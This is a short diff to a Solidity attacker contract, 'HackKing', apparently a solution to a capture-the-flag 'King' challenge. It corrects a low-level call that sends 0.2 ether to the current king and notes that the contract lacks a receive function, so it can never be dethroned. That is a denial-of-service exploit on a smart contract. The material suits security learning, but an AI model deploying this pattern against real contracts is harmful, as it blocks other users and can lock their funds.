@@ -9,7 +9,7 @@ contract HackKing {
     constructor() public payable {}
 
     function takeTheThrone() public {
-        address(king).call{value: 0.2 ether};
+        address(king).call{value: 0.2 ether}("");
     }
 
     //No receive function; cannot accept the transfer to leave the throne.
